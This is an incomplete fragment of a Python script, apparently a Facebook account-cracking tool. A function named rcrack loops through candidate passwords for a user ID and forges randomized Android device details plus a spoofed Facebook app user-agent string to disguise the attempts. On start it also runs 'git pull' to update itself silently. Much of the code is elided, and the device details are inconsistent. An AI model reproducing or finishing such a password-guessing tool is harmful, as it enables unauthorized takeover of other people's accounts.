import os,sys,time,json,random,re,string,platform,base64,json,uuid
os.system("git pull")
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            android_version = f"Android {random.randint(4, 13)}"
            model_options = ["Pixel", "Galaxy", "Xperia", "OnePlus"]
            device_model = random.choice(model_options)

            ua_string = "Dalvik/2.1.0 (Linux; U; Android 13; OnePlus Build/QP1A.118640.647)[FBAN/FB4A;FBAV/62.0.0.1973;FBBV/1983704;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/{density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T311|KOT49H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
